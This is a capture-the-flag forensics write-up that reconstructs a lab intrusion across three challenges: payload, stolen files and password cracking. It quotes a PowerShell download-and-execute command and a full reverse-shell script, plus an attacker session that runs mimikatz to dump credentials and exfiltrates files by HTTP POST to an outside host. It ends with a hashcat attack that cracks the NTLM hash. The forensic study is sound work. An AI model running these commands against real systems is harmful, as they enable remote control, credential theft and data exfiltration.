### LOCATE THE PAYLOAD

---

Medium | Forensics, IC | 75 points

---

### Description

The attackers seem to have gotten a foothold on our system. And executed some malicious code. We need to know what the code does.

---

### First Impressions

We are given four files,

- unlockthecity.json
- unlockthecity.zip
- unlockthecity.pcapng
- rockyou.txt

I decided to start by unzipping the zip folder. Inside seems to be multiple folders and files from a windows 10 machine. I ran some grep searches on the contents and got a hit for “hack” which shows a [https://evilai.challenge.hackazon.org/update.ps1](https://evilai.challenge.hackazon.org/update.ps1) link in the Users/unlockthecity/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt file.

This ConsoleHost file seems to be a log of commands run in powershell. The context of our URL in the file is echo IEX(New-Object Net.WebClient).DownloadString('[https://evilai.challenge.hackazon.org/update.ps1](https://evilai.challenge.hackazon.org/update.ps1)') | powershell -noprofile -

Googling seems to reveal that this command runs a script on a remote server and outputs its result to stdout. The command only works in my powershell by removing the pipe, when I do, I get this, our flag for part 1 of this challenge! 

```php
└─PS> echo IEX(New-Object Net.WebClient).DownloadString('https://evilai.challenge.hackazon.org/update.ps1%27)
IEX
$TCPClient = New-Object Net.Sockets.TCPClient('192.168.117.157', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()

# CTF{You_Found_The_EVIL_AI_Payload}
```

## STOLEN FILES

---

Medium | Forensics, IC | 75 points

---

### Description

To report to the authorities we must know exactly which files have been taken by the attacker. Are you able to figure this out?

---

Moving onto the pcapng file. We can examine it in wireshark and we find the following package when searching for suspiciously large packages. 

### Wireshark Package

```php
SHELL> cd C:\Temp
SHELL> curl -uri http://192.168.117.157:8888/mimikatz.exe -outfile mimikatz.exe
SHELL> & .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dump.txt
SHELL> cp dump.txt \\192.168.117.159\unlockthecity\dump.txt
cp : The network path was not found
At line:1 char:1
+ cp dump.txt \\192.168.117.159\unlockthecity\dump.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-Item], IOException
    + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Commands.CopyItemCommand
 
SHELL> $body = "file=$(get-content dump.txt -raw)"
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body $body
Invoke-RestMethod : The underlying connection was closed: The connection was closed unexpectedly.
At line:1 char:1
+ Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-RestMethod], WebExc 
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeRestMethodCommand
 
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body $body
POST request for /
SHELL> cd \\WEF\Secrets
SHELL> dir

    Directory: \\WEF\Secrets

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        7/15/2022  11:06 AM            180 A.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 B.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 C.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 D.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 E.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 F.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 G.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 H.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 I.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 J.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 K.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 L.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 M.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 N.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 O.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 P.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 Q.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 R.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 S.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 U.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 V.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 W.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 X.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 Y.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 Z.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 _.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 {.rtf                                                                 
-a----        7/15/2022  11:06 AM            180 }.rtf                                                                 

SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content C.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content T.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content F.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content {.rtf -raw)"
Invoke-Expression : At line:1 char:91
+ ... 192.168.117.157:8888 -method POST -body "file=$(get-content {.rtf -ra ...
+                                                                 ~
Missing closing '}' in statement block or type definition.
At line:1 char:515
+ ... BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-S ...
+                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : MissingEndCurlyBrace,Microsoft.PowerShell.Commands.InvokeExpressionCommand
 
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content `{.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content E.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content X.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content F.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content I.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content L.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content T.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content R.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content A.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content T.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content E.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content _.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content A.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content L.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content L.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content _.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content T.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content H.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content E.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content _.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content F.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content I.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content L.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content E.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content S.rtf -raw)"
POST request for /
SHELL> Invoke-RestMethod -uri http://192.168.117.157:8888 -method POST -body "file=$(get-content `}.rtf -raw)"
POST request for /
SHELL>
```

Inside there is a series of post requests for files named a-z.rtf and the requests spell out CTF{EXFILTRATE_ALL_THE_FILES}. 

## PASSWORD CRACKING

---

Medium | Forensics, IC | 75 points

---

### Description

Can you please find out whether the attack was caused by a weak password? We need to know whether the users are adhering to our password policy. Our password policy for the domain is CTF{[ROCKYOU_1]_[ROCKYOU_2]!} where [ROCKYOU_1] and [ROCKYOU_2] are distinct words from the rockyou.txt list.

---

We find another package in wireshark which shows us the result of the mimikatz malware package that was run. Mimikatz is a program that is able to show windows passwords in plaintext to perhaps we can find a password here?

### Mimikatz Result

```php
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Content-Type: application/x-www-form-urlencoded
Host: 192.168.117.157:8888
Content-Length: 5810
Connection: Keep-Alive

file=
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 303091 (00000000:00049ff3)
Session           : Interactive from 1
User Name         : unlockthecity
Domain            : WINDOMAIN
Logon Server      : DC
Logon Time        : 7/15/2022 12:36:04 PM
SID               : S-1-5-21-2619478417-2971000410-135028378-1107
	msv :	
	 [00000003] Primary
	 * Username : unlockthecity
	 * Domain   : WINDOMAIN
	 * NTLM     : c5c70d1571e4fcc0d818cceab3025fcf
	 * SHA1     : c8db2137682086005c05483bd0635ece23811243
	 * DPAPI    : 87bb7ccc8291ba57bf86452544b861ad
	tspkg :	
	wdigest :	
	 * Username : unlockthecity
	 * Domain   : WINDOMAIN
	 * Password : (null)
	kerberos :	
	 * Username : unlockthecity
	 * Domain   : WINDOMAIN.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/15/2022 12:35:28 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 56287 (00000000:0000dbdf)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/15/2022 12:35:27 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * NTLM     : 08479832c8a49b1c7926a41005a2ae37
	 * SHA1     : 13b5af68e56a7b5e12dac129c829c14ac22e4022
	tspkg :	
	wdigest :	
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * Password : (null)
	kerberos :	
	 * Username : WIN10$
	 * Domain   : windomain.local
	 * Password : cm(kha)wk2Pc#b/+P2p$:ZU6_ury8i*8r;x]d=XHy(j[pWI[)Xz4=?!`xw<X@G'C.03]I(G:XU7NpIjIQWh9W&!u*Vd?tljcAH38!hW;zyi-^zX)0p;N6#B*
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN10$
Domain            : WINDOMAIN
Logon Server      : (null)
Logon Time        : 7/15/2022 12:35:27 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * NTLM     : 08479832c8a49b1c7926a41005a2ae37
	 * SHA1     : 13b5af68e56a7b5e12dac129c829c14ac22e4022
	tspkg :	
	wdigest :	
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * Password : (null)
	kerberos :	
	 * Username : win10$
	 * Domain   : WINDOMAIN.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 34792 (00000000:000087e8)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/15/2022 12:35:27 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * NTLM     : 08479832c8a49b1c7926a41005a2ae37
	 * SHA1     : 13b5af68e56a7b5e12dac129c829c14ac22e4022
	tspkg :	
	wdigest :	
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * Password : (null)
	kerberos :	
	 * Username : WIN10$
	 * Domain   : windomain.local
	 * Password : cm(kha)wk2Pc#b/+P2p$:ZU6_ury8i*8r;x]d=XHy(j[pWI[)Xz4=?!`xw<X@G'C.03]I(G:XU7NpIjIQWh9W&!u*Vd?tljcAH38!hW;zyi-^zX)0p;N6#B*
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 34683 (00000000:0000877b)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/15/2022 12:35:27 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * NTLM     : 08479832c8a49b1c7926a41005a2ae37
	 * SHA1     : 13b5af68e56a7b5e12dac129c829c14ac22e4022
	tspkg :	
	wdigest :	
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * Password : (null)
	kerberos :	
	 * Username : WIN10$
	 * Domain   : windomain.local
	 * Password : cm(kha)wk2Pc#b/+P2p$:ZU6_ury8i*8r;x]d=XHy(j[pWI[)Xz4=?!`xw<X@G'C.03]I(G:XU7NpIjIQWh9W&!u*Vd?tljcAH38!hW;zyi-^zX)0p;N6#B*
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 33785 (00000000:000083f9)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/15/2022 12:35:27 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * NTLM     : 08479832c8a49b1c7926a41005a2ae37
	 * SHA1     : 13b5af68e56a7b5e12dac129c829c14ac22e4022
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN10$
Domain            : WINDOMAIN
Logon Server      : (null)
Logon Time        : 7/15/2022 12:35:27 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN10$
	 * Domain   : WINDOMAIN
	 * Password : (null)
	kerberos :	
	 * Username : win10$
	 * Domain   : WINDOMAIN.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

mimikatz(commandline) # exit
Bye!
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.10.4
Date: Fri, 15 Jul 2022 13:04:11 GMT
Content-type: text/html

POST request for /
```

We see that our primary user UnlockTheCity password is hashed in NTLM as c5c70d1571e4fcc0d818cceab3025fcf. So not quite plaintext but I suppose that is where the cracking part of this challenge comes in.

We have been told that the password policy for the domain is CTF{[ROCKYOU]_[ROCKYOU]!} where at [ROCKYOU] you are allowed to pick any word from the rockyou.txt list.

So with this information we can use hashcat to crack the password. First we duplicate the rockyou text file and change its contents to CTF{wordshere_ and wordshere} respectively to fit the password policy. Then we simply run hashcat using a combined dictionary attack with both files.

```php
C:\Users\Matilda\Downloads\hashcat-5.1.0>hashcat64.exe -m 1000 -a 1 password.txt rockyouBegin.txt rockyouEnd.txt
hashcat (v5.1.0) starting...

* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
ADL_Overdrive_Caps(): -8

ADL_Overdrive_Caps(): -8

ADL_Overdrive_Caps(): -8

ADL_Overdrive_Caps(): -8

nvmlDeviceGetFanSpeed(): Not Supported

OpenCL Platform #1: Advanced Micro Devices, Inc.
================================================
* Device #1: gfx902, 4869/6240 MB allocatable, 7MCU

OpenCL Platform #2: NVIDIA Corporation
======================================
* Device #2: NVIDIA GeForce GTX 1660 Ti with Max-Q Design, 1535/6143 MB allocatable, 24MCU

Dictionary cache built:
* Filename..: rockyouBegin.txt
* Passwords.: 5975702
* Bytes.....: 87025903
* Keyspace..: 5975694
* Runtime...: 1 sec

Dictionary cache built:
* Filename..: rockyouEnd.txt
* Passwords.: 5975702
* Bytes.....: 69098797
* Keyspace..: 5975695
* Runtime...: 1 sec

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: rockyouBegin.txt
* Passwords.: 5975694
* Bytes.....: 87025903
* Keyspace..: 35708924757330

Driver temperature threshold met on GPU #2. Expect reduced performance.
Driver temperature threshold met on GPU #2. Expect reduced performance.ass [c]heckpoint [q]uit =>
Driver temperature threshold met on GPU #2. Expect reduced performance.

Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password- and salt-length (typically down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your OpenCL runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>

Session..........: hashcat
Status...........: Running
Hash.Type........: NTLM
Hash.Target......: c5c70d1571e4fcc0d818cceab3025fcf
Time.Started.....: Wed Jul 20 20:17:47 2022 (14 secs)
Time.Estimated...: Wed Jul 20 22:53:57 2022 (2 hours, 35 mins)
Guess.Base.......: File (rockyouBegin.txt), Left Side
Guess.Mod........: File (rockyouEnd.txt), Right Side
Speed.#1.........:   629.0 MH/s (3.75ms) @ Accel:64 Loops:32 Thr:256 Vec:1
Speed.#2.........:  3182.1 MH/s (20.85ms) @ Accel:256 Loops:64 Thr:256 Vec:1
Speed.#*.........:  3811.1 MH/s
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 48844767232/35708924757330 (0.14%)
Rejected.........: 0/48844767232 (0.00%)
Restore.Point....: 0/5975694 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:71264-71296 Iteration:0-32
Restore.Sub.#2...: Salt:0 Amplifier:25856-25920 Iteration:0-64
Candidates.#1....: CTF{123456_brat!} -> CTF{022580_blaize!}
Candidates.#2....: CTF{022579_010706!} -> CTF{jasonmae_ramadan!}
Hardware.Mon.#1..: Util: 90% Core:1600MHz Mem: 400MHz Bus:16
Hardware.Mon.#2..: Temp: 32c Util: 70% Core:1103MHz Mem: 644MHz Bus:8

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>

Session..........: hashcat
Status...........: Running
Hash.Type........: NTLM
Hash.Target......: c5c70d1571e4fcc0d818cceab3025fcf
Time.Started.....: Wed Jul 20 20:17:47 2022 (22 secs)
Time.Estimated...: Wed Jul 20 22:51:43 2022 (2 hours, 33 mins)
Guess.Base.......: File (rockyouBegin.txt), Left Side
Guess.Mod........: File (rockyouEnd.txt), Right Side
Speed.#1.........:   685.3 MH/s (3.73ms) @ Accel:64 Loops:32 Thr:256 Vec:1
Speed.#2.........:  3181.2 MH/s (20.79ms) @ Accel:256 Loops:64 Thr:256 Vec:1
Speed.#*.........:  3866.5 MH/s
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 82109792256/35708924757330 (0.23%)
Rejected.........: 0/82109792256 (0.00%)
Restore.Point....: 0/5975694 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:127872-127904 Iteration:0-32
Restore.Sub.#2...: Salt:0 Amplifier:42880-42944 Iteration:0-64
Candidates.#1....: CTF{123456_073079!} -> CTF{022580_07051989!}
Candidates.#2....: CTF{022579_loves2!} -> CTF{jasonmae_johnny4!}
Hardware.Mon.#1..: Util: 90% Core: 400MHz Mem: 400MHz Bus:16
Hardware.Mon.#2..: Temp: 33c Util: 68% Core:1080MHz Mem: 635MHz Bus:8

c5c70d1571e4fcc0d818cceab3025fcf:CTF{city123_unlocked!}

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: c5c70d1571e4fcc0d818cceab3025fcf
Time.Started.....: Wed Jul 20 20:17:47 2022 (46 secs)
Time.Estimated...: Wed Jul 20 20:18:33 2022 (0 secs)
Guess.Base.......: File (rockyouBegin.txt), Left Side
Guess.Mod........: File (rockyouEnd.txt), Right Side
Speed.#1.........:   770.4 MH/s (3.82ms) @ Accel:64 Loops:32 Thr:256 Vec:1
Speed.#2.........:  3180.3 MH/s (21.21ms) @ Accel:256 Loops:64 Thr:256 Vec:1
Speed.#*.........:  3950.8 MH/s
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 176357900288/35708924757330 (0.49%)
Rejected.........: 0/176357900288 (0.00%)
Restore.Point....: 0/5975694 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:286976-287008 Iteration:0-32
Restore.Sub.#2...: Salt:0 Amplifier:91136-91200 Iteration:0-64
Candidates.#1....: CTF{123456_080526!} -> CTF{022580_0746255119!}
Candidates.#2....: CTF{022579_viejito!} -> CTF{jasonmae_trese13!}
Hardware.Mon.#1..: Util: 82% Core: 400MHz Mem: 400MHz Bus:16
Hardware.Mon.#2..: Temp: 37c Util: 68% Core:1055MHz Mem: 625MHz Bus:8

Started: Wed Jul 20 20:17:19 2022
Stopped: Wed Jul 20 20:18:35 2022
```

Our result is c5c70d1571e4fcc0d818cceab3025fcf:CTF{city123_unlocked!} which is our final flag!
